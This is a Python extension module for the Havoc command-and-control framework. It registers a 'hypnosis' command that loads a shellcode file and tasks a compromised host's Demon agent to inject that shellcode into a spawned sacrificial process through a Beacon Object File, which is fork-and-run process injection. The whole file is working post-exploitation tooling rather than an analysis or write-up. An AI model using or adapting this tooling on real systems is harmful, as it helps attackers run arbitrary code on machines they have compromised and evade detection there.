from havoc import Demon, RegisterCommand, RegisterModule
from os.path import exists
from struct import pack, calcsize

class Packer:
    def __init__(self):
        self.buffer: bytes = b''
        self.size: int = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addbytes(self, b):
        if b is None:
            b = b''
        fmt = "<L{}s".format(len(b))
        self.buffer += pack(fmt, len(b), b)
        self.size += calcsize(fmt)

    def addstr(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s) + 1, s)
        self.size += calcsize(fmt)

    def addint(self, dint):
        self.buffer += pack("<i", dint)
        self.size += 4

def hypnosis(demon_id, *args):
    
    task_id: str    = None
    demon  : Demon  = None
    packer : Packer = Packer()
    binary : bytes  = None

    demon = Demon(demon_id)

    if len(args) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False
    
    path = args[0]

    if not exists(path):
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Shellcode not found at {path}")

    with open(path, 'rb') as handle:
        binary = handle.read()

    if not binary:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Specified file is not binary")
        return

    packer.addbytes(binary)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked the demon to execute Process Hypnosis via BOF [ binary length: {len(binary)} bytes ]")

    demon.InlineExecute(task_id, "go", "/mnt/c/Users/obliv/OneDrive/Desktop/Malw/Process_Hypnosis_BOF/Bin/Hypnosis.x64.o", packer.getbuffer(), False)

    return task_id

RegisterCommand(hypnosis, "", "hypnosis", "Process Injection using Fork&Run, spawn sacrificial process(SpawnTo) and inject shellcode using Hypnosis technique", 0, "[path to shellcode]", "/tmp/demon.x64.bin")

